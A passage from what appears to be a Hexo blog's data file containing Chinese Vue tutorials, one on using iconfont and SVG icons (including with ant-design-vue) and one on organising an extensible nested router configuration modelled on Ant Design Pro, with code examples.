ie9+,及现代浏览器。</li>\n<li>浏览器渲染 svg 的性能一般，还不如 png。</li>\n</ul>\n<p>第一步：拷贝项目下面生成的 symbol 代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js</span></span><br></pre></td></tr></table></figure>\n<p>第二步：加入通用 css 代码（引入一次就行）：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-class\">.icon</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    width: 1em;</span></span><br><span class=\"line\"><span class=\"undefined\">    height: 1em;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">vertical-align</span>: <span class=\"selector-tag\">-0</span><span class=\"selector-class\">.15em</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">    fill: currentColor;</span></span><br><span class=\"line\"><span class=\"undefined\">    overflow: hidden;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>第三步：挑选相应图标并获取类名，应用于页面：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">class</span>=<span class=\"string\">\"icon\"</span> <span class=\"attr\">aria-hidden</span>=<span class=\"string\">\"true\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">\"#icon-xxx\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">use</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>普通页面测试代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, initial-scale=1.0\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://at.alicdn.com/t/font_1212356_01bv0xpc70ab.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">      <span class=\"selector-class\">.icon</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        width: 1em;</span></span><br><span class=\"line\"><span class=\"undefined\">        height: 1em;</span></span><br><span class=\"line\"><span class=\"css\">        <span class=\"selector-tag\">vertical-align</span>: <span class=\"selector-tag\">-0</span><span class=\"selector-class\">.15em</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">        fill: currentColor;</span></span><br><span class=\"line\"><span class=\"undefined\">        overflow: hidden;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">class</span>=<span class=\"string\">\"icon\"</span> <span class=\"attr\">aria-hidden</span>=<span class=\"string\">\"true\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">use</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">\"#icontixingshixiang\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">use</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>.vue</code>单文件开发中，因为是模块化开发，是通过 webpack 编译打包的，因此第一步略有不同：保存该 js 文件到本地，在<code>main.js</code>中引入<code>import &quot;./assets/iconfont.js&quot;;</code>。</p>\n<h2 id=\"ant-design-vue-中使用\"><a href=\"#ant-design-vue-中使用\" class=\"headerlink\" title=\"ant-design-vue 中使用\"></a>ant-design-vue 中使用</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"icons-list\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">icon-font</span> <span class=\"attr\">type</span>=<span class=\"string\">\"icon-tuichu\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">icon-font</span> <span class=\"attr\">type</span>=<span class=\"string\">\"icon-facebook\"</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">icon-font</span> <span class=\"attr\">type</span>=<span class=\"string\">\"icon-twitter\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> &#123; Icon &#125; <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue\"</span>;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">const</span> IconFont = Icon.createFromIconfontCN(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">    scriptUrl: <span class=\"string\">\"//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js\"</span></span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;);</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    components: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      IconFont</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">  <span class=\"selector-class\">.icons-list</span> &gt;&gt;&gt; <span class=\"selector-class\">.anticon</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    margin-right: 6px;</span></span><br><span class=\"line\"><span class=\"undefined\">    font-size: 24px;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>示例是局部注册，当然对于通用的图标也可以 main.js 中进行全局注册。</p>\n<h2 id=\"直接使用-svg-图标文件\"><a href=\"#直接使用-svg-图标文件\" class=\"headerlink\" title=\"直接使用 svg 图标文件\"></a>直接使用 svg 图标文件</h2><p>第一步：下载 svg 文件，保存到本地；</p>\n<p>第二步：安装 loader:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install vue-svg-loader -D</span><br></pre></td></tr></table></figure>\n<p>第三步：组件中引入 svg 文件，注册组件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Logo <span class=\"keyword\">from</span> <span class=\"string\">\"@/assets/logo.svg\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  components: &#123;</span><br><span class=\"line\">    Logo</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>第四步：使用该图标组件：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">Logo</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.iconfont.cn/help/detail?spm=a313x.7781069.1998910419.d8cf4382a&amp;helptype=code\" target=\"_blank\" rel=\"noopener\">IconFont</a></p>\n<p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@高扩展性路由","date":"2019-05-21T03:39:53.000Z","updated":"2019-05-21T03:39:53.000Z","_content":"\n# 概述\n\n一个高扩展性的路由应该是根据页面展示结构的特点进行的抽象，再结合业务模块进行的合理层级划分。本次总结是根据中后台管理系统[Ant Design Pro](https://preview.pro.ant.design/dashboard/analysis)。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n整体来说没什么难点，主要对新手有个目录结构案例参考，其次对于单纯提供 `router-view` 的组件可以用函数式组件`component: { render: h => h(\"router-view\") }`。\n\n## 第一层级\n\n第一层级应该是布局模板，例如登录注册页面与其他的内容展示页，通常页面布局结构是不同的，因此可以分成两个 UserLayout.vue 和 BasicLayout.vue。\n\n## 第二层级\n\n一级业务模块，直观的就是对应的一级菜单，例如 Dashboard、个人页等。\n\n## 其他层级\n\n按照业务模块层层嵌套，例如 Dashboard 下面有 分析页 和 监控页等。\n\n## 示例代码\n\n```js\nconst router = new Router({\n  mode: \"history\",\n  base: process.env.BASE_URL,\n  routes: [\n    {\n      path: \"/user\",\n      hideInMenu: true,\n      component: () =>\n        import(/* webpackChunkName: \"user\" */ \"./layouts/UserLayout.vue\"),\n      children: [\n        {\n          path: \"/user\",\n          redirect: \"/user/login\"\n        },\n        {\n          path: \"/user/login\",\n          name: \"login\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n        },\n        {\n          path: \"/user/register\",\n          name: \"register\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Register.vue\")\n        }\n      ]\n    },\n    {\n      path: \"/\",\n      meta: { authority: [\"user\", \"admin\"] },\n      component: () =>\n        import(/* webpackChunkName: \"basic\" */ \"./layouts/BasicLayout.vue\"),\n      children: [\n        {\n          path: \"/\",\n          redirect: \"/dashboard/analysis\"\n        },\n        // dashboard\n        {\n          path: \"/dashboard\",\n          name: \"dashboard\",\n          meta: { icon: \"dashboard\", title: \"仪表盘\" },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/dashboard/analysis\",\n              name: \"analysis\",\n              meta: { title: \"分析页\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"dashboard\" */ \"./views/Dashboard/Analysis.vue\"\n                )\n            }\n          ]\n        },\n        // form\n        {\n          path: \"/form\",\n          name: \"form\",\n          meta: { icon: \"form\", title: \"表单\", authority: [\"admin\"] },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/form/basic-form\",\n              name: \"basic-form\",\n              meta: { title: \"基础表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/BasicForm.vue\"\n                )\n            },\n            {\n              path: \"/form/step-form\",\n              name: \"step-form\",\n              hideChildrenInMenu: true,\n              meta: { title: \"分布表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm.vue\"\n                ),\n              children: [\n                {\n                  path: \"/form/step-form\",\n                  redirect: \"/form/step-form/info\"\n                },\n                {\n                  path: \"/form/step-form/info\",\n                  name: \"info\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step1\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/confirm\",\n                  name: \"confirm\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step2\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/result\",\n                  name: \"result\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step3\"\n                    )\n                }\n              ]\n            }\n          ]\n        }\n      ]\n    }\n  ]\n});\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-router.md","raw":"---\ntitle: Vue实战@高扩展性路由\npermalink: vue-in-action-router\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-21 11:39:53\nupdated: 2019-05-21 11:39:53\n---\n\n# 概述\n\n一个高扩展性的路由应该是根据页面展示结构的特点进行的抽象，再结合业务模块进行的合理层级划分。本次总结是根据中后台管理系统[Ant Design Pro](https://preview.pro.ant.design/dashboard/analysis)。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n整体来说没什么难点，主要对新手有个目录结构案例参考，其次对于单纯提供 `router-view` 的组件可以用函数式组件`component: { render: h => h(\"router-view\") }`。\n\n## 第一层级\n\n第一层级应该是布局模板，例如登录注册页面与其他的内容展示页，通常页面布局结构是不同的，因此可以分成两个 UserLayout.vue 和 BasicLayout.vue。\n\n## 第二层级\n\n一级业务模块，直观的就是对应的一级菜单，例如 Dashboard、个人页等。\n\n## 其他层级\n\n按照业务模块层层嵌套，例如 Dashboard 下面有 分析页 和 监控页等。\n\n## 示例代码\n\n```js\nconst router = new Router({\n  mode: \"history\",\n  base: process.env.BASE_URL,\n  routes: [\n    {\n      path: \"/user\",\n      hideInMenu: true,\n      component: () =>\n        import(/* webpackChunkName: \"user\" */ \"./layouts/UserLayout.vue\"),\n      children: [\n        {\n          path: \"/user\",\n          redirect: \"/user/login\"\n        },\n        {\n          path: \"/user/login\",\n          name: \"login\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Login.vue\")\n        },\n        {\n          path: \"/user/register\",\n          name: \"register\",\n          component: () =>\n            import(/* webpackChunkName: \"user\" */ \"./views/User/Register.vue\")\n        }\n      ]\n    },\n    {\n      path: \"/\",\n      meta: { authority: [\"user\", \"admin\"] },\n      component: () =>\n        import(/* webpackChunkName: \"basic\" */ \"./layouts/BasicLayout.vue\"),\n      children: [\n        {\n          path: \"/\",\n          redirect: \"/dashboard/analysis\"\n        },\n        // dashboard\n        {\n          path: \"/dashboard\",\n          name: \"dashboard\",\n          meta: { icon: \"dashboard\", title: \"仪表盘\" },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/dashboard/analysis\",\n              name: \"analysis\",\n              meta: { title: \"分析页\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"dashboard\" */ \"./views/Dashboard/Analysis.vue\"\n                )\n            }\n          ]\n        },\n        // form\n        {\n          path: \"/form\",\n          name: \"form\",\n          meta: { icon: \"form\", title: \"表单\", authority: [\"admin\"] },\n          component: { render: h => h(\"router-view\") },\n          children: [\n            {\n              path: \"/form/basic-form\",\n              name: \"basic-form\",\n              meta: { title: \"基础表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/BasicForm.vue\"\n                )\n            },\n            {\n              path: \"/form/step-form\",\n              name: \"step-form\",\n              hideChildrenInMenu: true,\n              meta: { title: \"分布表单\" },\n              component: () =>\n                import(\n                  /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm.vue\"\n                ),\n              children: [\n                {\n                  path: \"/form/step-form\",\n                  redirect: \"/form/step-form/info\"\n                },\n                {\n                  path: \"/form/step-form/info\",\n                  name: \"info\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step1\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/confirm\",\n                  name: \"confirm\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step2\"\n                    )\n                },\n                {\n                  path: \"/form/step-form/result\",\n                  name: \"result\",\n                  component: () =>\n                    import(\n                      /* webpackChunkName: \"form\" */ \"./views/Forms/StepForm/Step3\"\n                    )\n                }\n              ]\n            }\n          ]\n        }\n      ]\n    }\n  ]\n});\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-router","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xr006xwovvmwyx8p1g","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>一个高扩展性的路由应该是根据页面展示结构的特点进行的抽象，再结合业务模块进行的合理层级划分。本次总结是根据中后台管理系统<a href=\"https://preview.pro.ant.design/dashboard/analysis\" target=\"_blank\" rel=\"noopener\">Ant Design Pro</a>。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>整体来说没什么难点，主要对新手有个目录结构案例参考，其次对于单纯提供 <code>router-view</code> 的组件可以用函数式组件<code>component: { render: h =&gt; h(&quot;router-view&quot;) }</code>。</p>\n<h2 id=\"第一层级\"><a href=\"#第一层级\" class=\"headerlink\" title=\"第一层级\"></a>第一层级</h2><p>第一层级应该是布局模板，例如登录注册页面与其他的内容展示页，通常页面布局结构是不同的，因此可以分成两个 UserLayout.vue 和 BasicLayout.vue。</p>\n<h2 id=\"第二层级\"><a href=\"#第二层级\" class=\"headerlink\" title=\"第二层级\"></a>第二层级</h2><p>一级业务模块，直观的就是对应的一级菜单，例如 Dashboard、个人页等。</p>\n<h2 id=\"其他层级\"><a href=\"#其他层级\" class=\"headerlink\" title=\"其他层级\"></a>其他层级</h2><p>按照业务模块层层嵌套，例如 Dashboard 下面有 分析页 和 监控页等。</p>\n<h2 id=\"示例代码\"><a href=\"#示例代码\" class=\"headerlink\" title=\"示例代码\"></a>示例代码</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> router = <span class=\"keyword\">new</span> Router(&#123;</span><br><span class=\"line\">  mode: <span class=\"string\">\"history\"</span>,</span><br><span class=\"line\">  base: process.env.BASE_URL,</span><br><span class=\"line\">  routes: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/user\"</span>,</span><br><span class=\"line\">      hideInMenu: <span class=\"literal\">true</span>,</span><br><span class=\"line\">      component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./layouts/UserLayout.vue\"</span>),</span><br><span class=\"line\">      children: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user\"</span>,</span><br><span class=\"line\">          redirect: <span class=\"string\">\"/user/login\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user/login\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"login\"</span>,</span><br><span class=\"line\">          component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">            <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Login.vue\"</span>)</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/user/register\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"register\"</span>,</span><br><span class=\"line\">          component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">            <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"user\" */</span> <span class=\"string\">\"./views/User/Register.vue\"</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">\"/\"</span>,</span><br><span class=\"line\">      meta: &#123; <span class=\"attr\">authority</span>: [<span class=\"string\">\"user\"</span>, <span class=\"string\">\"admin\"</span>] &#125;,</span><br><span class=\"line\">      component: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span></span><br><span class=\"line\">        <span class=\"keyword\">import</span>(<span class=\"comment\">/* webpackChunkName: \"basic\" */</span> <span class=\"string\">\"./layouts/BasicLayout.vue\"</span>),</span><br><span class=\"line\">      children: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/\"</span>,</span><br><span class=\"line\">          redirect: <span class=\"string\">\"/dashboard/analysis\"</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"comment\">// dashboard</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          path: <span class=\"string\">\"/dashboard\"</span>,</span><br><span class=\"line\">          name: <span class=\"string\">\"dashboard\"</span>,</span><br><span class=\"line\">          meta: &#123; <span class=\"attr\">icon</span>: <span class=\"string\">\"dashboard\"</span>, <span class=\"attr\">title</span>: <span class=\"string\">\"仪表盘\"</span> &#125;,</span><br><span class=\"line\">          component: &#123; <span class=\"attr\">render</span>: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(<span class=\"string\">\"router-view\"</span>) &#125;,</span><br><span class=\"line\">          children: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              path: <span class=\"string\">\"/dashboard/analysis\"</span>,</span><br><span class=\"line\">              name: <span class=\"string\">\"analysis\"</span>,</span><br><span class=\"line\">              meta: &#123; <span class=\"attr\">title</span>: <span class=\"string\">\"分析页\"</span> &#125;,</span><br><span class=\"line\">              component: <span class=\"function\"><span class=\"params\">()</span> 